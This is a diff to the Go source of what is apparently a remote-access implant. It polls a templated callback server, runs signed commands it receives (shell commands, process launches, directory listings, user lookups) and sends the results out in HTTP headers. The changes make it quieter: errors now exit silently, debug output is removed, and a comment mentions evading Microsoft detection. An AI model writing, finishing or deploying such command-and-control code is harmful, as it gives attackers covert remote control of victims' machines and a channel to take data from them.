@@ -1,4 +1,3 @@
-
 package main
 
 import (
@@ -10,8 +9,7 @@ import (
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
-	"io/ioutil"
-	"log"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
@@ -22,9 +20,9 @@ import (
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
-func StrH(s string) uint32{
+func StrH(s string) uint32 {
 	var h uint32
-	for _,c := range s{
+	for _, c := range s {
 		h = (h << 5) + uint32(c)
 	}
 	return h
@@ -61,14 +59,13 @@ func readDir(path string) (contents string) {
 }
 
 func runCommand(path string) (PID string) {
-	//cmdToRun := path
-	//args := nil
+	//starts a process and returns the PID of it
 	procAttr := new(os.ProcAttr)
 	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
 	if process, err := os.StartProcess(path, nil, procAttr); err != nil {
 
 	} else {
-		PID = string(process.Pid)
+		PID = fmt.Sprint(PID, process.Pid)
 	}
 	return
 }
@@ -96,16 +93,16 @@ func main() {
     const serverCert = "-----BEGIN CERTIFICATE-----\n{{.ServerKey}}\n-----END CERTIFICATE-----"
 
 	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
-    PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
+	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if PEMBlock == nil {
-		log.Fatal("Could not parse Public Key PEM")
+		os.Exit(0)
 	}
 	if PEMBlock.Type != "PUBLIC KEY" {
-		log.Fatal("Found wrong key type")
+		os.Exit(0)
 	}
 	pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
 	if err2 != nil {
-		log.Fatal("Found wrong key type")
+		os.Exit(0)
 	}
 
 	uuid := "{{.UUID}}"
@@ -113,107 +110,60 @@ func main() {
 	//client := &http.Client{}
 	expectedFingerprint = {{.Fingerprint}}
 	client := &http.Client{
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{
-                InsecureSkipVerify: true, // Set to false to enforce certificate verification
-                VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
-                    // Extract the peer certificate from the raw certificates
-                    peerCert, err := x509.ParseCertificate(rawCerts[0])
-                    if err != nil {
-                        return err
-                    }
-                    fmt.Printf("Got peer")
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true, // Set to false to enforce certificate verification
+				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+					// Extract the peer certificate from the raw certificates
+					peerCert, err := x509.ParseCertificate(rawCerts[0])
+					if err != nil {
+						return err
+					}
 
-                    // Calculate the fingerprint of the certificate
-                    actualFingerprint := sha256.Sum256(peerCert.Raw)
+					// Calculate the fingerprint of the certificate
+					actualFingerprint := sha256.Sum256(peerCert.Raw)
 
-                    actualFingerprintStr := hex.EncodeToString(actualFingerprint[:])
+					actualFingerprintStr := hex.EncodeToString(actualFingerprint[:])
 					h1 := StrH(actualFingerprintStr)
-                    // Compare the actual fingerprint with the expected one
+					// Compare the actual fingerprint with the expected one
 
-                    if h1 != expectedFingerprint {
-                        return fmt.Errorf("certificate fingerprint mismatch")
-                        os.Exit(1)
-                    }
+					if h1 != expectedFingerprint {
+						fmt.Println("Issue with fingerprint")
+						os.Exit(0)
+					}
 
-                    // Certificate is valid, no error
-                    return nil
-                },
-            },
-        },
-    }
+					// Certificate is valid, no error
+					return nil
+				},
+			},
+		},
+	}
 
-	result := getCurrentUser()
-	toSend := string(result)
-	toSend = strings.Replace(toSend, "\n", "", -1)
-	fmt.Printf(toSend)
-
-	//time.Sleep(10)
-//	req, err := http.NewRequest("GET", "{{.CallBack}}/", nil)
-//	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
-//	resp, err := client.Do(req)
-
-//	if err != nil {
-//		panic(err)
-//	}
-
-//	defer resp.Body.Close()
-
-	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
 		// current issue is that we're not retrieving and executing the new ocmmand
 		req, err := http.NewRequest("GET", "{{.CallBack}}/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err := client.Do(req)
-		body, err := ioutil.ReadAll(resp.Body)
-		//body = string(body)
-		//fmt.Printf(body)
-		statusC := resp.Status
-		if err != nil {
-			log.Fatalln(err)
-		}
+		body, err := io.ReadAll(resp.Body)
 
 		//Convert the body to type string
 		sb := string(body)
-		for sb == "0" {
-			time.Sleep(2 * time.Second)
-			req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
-			req.Header.Add("APPSESSIONID", uuid)
-			resp, err = client.Do(req)
-			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				log.Fatalln(err)
+		sb = strings.TrimSuffix(sb, "\n")
+		if sb == "" {
+			for sb == "" { // An empty string represents a nil response body
+				time.Sleep(2 * time.Second)
+				req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
+				req.Header.Add("APPSESSIONID", uuid)
+				resp, _ := client.Do(req)
+				body, _ := io.ReadAll(resp.Body)
+				sb = string(body)
+				sb = strings.TrimSuffix(sb, "\n")
 			}
-			sb = string(body)
 		}
-		// After verifying we have a command to execute, we now need to grab the commands signature
-		// This is stored in a header value of the request
-		sig := resp.Header.Get("Verifier")
-		fmt.Printf(sig + "\n")
-		// This is trying to fix the issue of getting 500 status codes
-		// when the DB is cleared
-		//
-		//statusC = string(statusC)
-		fmt.Printf(statusC)
-		fmt.Printf("\n")
-		for statusC == "'500'" {
-			time.Sleep(2 * time.Second)
-			req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
-			req.Header.Add("APPSESSIONID", uuid)
-			resp, err = client.Do(req)
-			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			sb = string(body)
-			statusC = resp.Status
-		}
-		fmt.Printf(sb + "\n")
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
-		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
-		sb1 := strings.Fields(sb) // idk how I never heard of the Fields method
-		command := sb[1:]
+		//string_contents := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		string_contents := strings.Fields(sb) // idk how I never heard of the Fields method
 
 		h := sha256.New()
 		h.Write([]byte(sb))
@@ -223,54 +173,48 @@ func main() {
 		signature, _ := hex.DecodeString(rawSignature)
 		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
 		if err != nil {
-			// if error is not nil, retry getting the command
 			time.Sleep(2 * time.Second)
 			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, _ = client.Do(req)
-			body, _ := ioutil.ReadAll(resp.Body)
+			body, _ := io.ReadAll(resp.Body)
 			sb = string(body)
 		}
 
 		// We are turning this into a switch statement
 		// We need to append the results of these functions to the result string
 		// Then we send it
-		switch sb1[0] {
+		result := ""
+		switch string_contents[0] {
 		case "pwd":
 			result = getCurrentDir()
 		case "gcu":
 			result = getCurrentUser()
 		case "rc":
-			result = runCommand(command)
+			result = runCommand(string_contents[1])
 		case "rd":
-			result = readDir(sb1[1])
+			result = readDir(string_contents[1])
 		case "terminal":
-			commandToRun := strings.Join(sb1, ",")
+			commandToRun := strings.Join(string_contents, ",")
 			result = terminal(commandToRun)
 		case "pid":
-		    pid := os.Getpid()
-		    result = fmt.Sprint(pid)
+			pid := os.Getpid()
+			result = fmt.Sprint(pid)
 		case "fing":
-			expectedFingerprint = StrH(sb1[1])
-
-		//case "groups":
-		//    result := getGroups()
+			expectedFingerprint = StrH(string_contents[1])
 
 		}
 
 		toSend := string(result)
-		fmt.Printf(toSend)
 		toSend = strings.Replace(toSend, "\n", "", -1)
-		fmt.Printf(toSend)
 
 		time.Sleep(2 * time.Second)
 		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", nil)
 		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
 		resp, err = client.Do(req)
 		if err != nil {
-			panic(err)
+			os.Exit(0)
 		}
-		defer resp.Body.Close()
 	}
 
 }
